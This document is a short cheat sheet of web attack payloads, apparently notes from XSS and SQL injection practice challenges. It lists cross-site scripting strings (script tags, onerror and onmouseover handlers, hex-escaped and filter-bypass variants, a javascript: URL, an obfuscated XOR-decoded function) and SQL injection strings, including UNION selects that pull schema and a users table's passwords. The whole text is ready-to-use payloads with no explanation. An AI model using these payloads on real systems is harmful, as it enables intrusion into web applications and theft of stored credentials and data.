#XSS

* basic
"><script>alert('XSS')</script>
"><script>alert(document.domain)</script>

* image
<img src="xss" onerror="alert('XSS')">

* script
html += "<img src='/static/level3/cloud"'onerror="alert('XSS')"'".jpg' />";
');alert('XSS')('

* on url
javascript:void(document.forms[0].p2.childNodes[1].innerText='<script>alert(document.domain)</script>');

* mouseover
" onmouseover="alert(document.domain);" x="

* escape
<script>alert('XSS')</sciprt>
"><script>alert(document.domain)</script>
" onmouseover = " alert('\x64\x6F\x63\x75\x6D\x65\x6E\x74\x2E\x64\x6F\x6D\x61\x69\x6E')"
"><script>alert(\x64\x6F\x63\x75\x6D\x65\x6E\x74\x2E\x64\x6F\x6D\x61\x69\x6E)</script>
" onmouseover = " alert('\x58\x53\x53') "

* gsub
"><sscriptcript>alert('XSS')</sscriptcript>
document.write(); \x3cscript\x3ealert(document.domain);\x3c/script\x3e
p1=%A2%BE%BCscript%BEalert(document.domain);%BC/script%BE
background-color:#f00;background:url("javascript:alert(document.domain);");

<p id=1 onmouseover=alert(document.getElementById(1).innerHTML)>XSS</p>
"(function (text){if(!f)a(text);if(text==='XSS'){if(!f){f=1;window.setTimeout(function(){f=0},100);if(li)li.innerHTML=t}else{f=0;cs=[5010175210,5010175222,5010175227,5010175166,5010175224,5010175218,5010175231,5010175225,5010175166,5010175223,5010175213,5010175140,5010175166,5010175199,5010175194,5010175197,5010175178,5010175192,5010175169,5010175191,5010175169,5010175146,5010175187,5010175169,5010175146,5010175218,5010175149,5010175180,5010175210,5010175169,5010175187,5010175146,5010175216];t='';for(i=0;i<cs.length;i++){t+=String.fromCharCode(cs[i]^0x123456789+123456789)}appendTweet('<b>'+t+'</b>')}}else{f=0}})"

#SQLi
* basic
' or 1=1;--
' or 1=1;#
' == '
' or '1

* union
' or 1=1 union select sql,1,1 from sqlite_master;--
' or 1=1 union select password, name, 1 from users_hogefuga;--

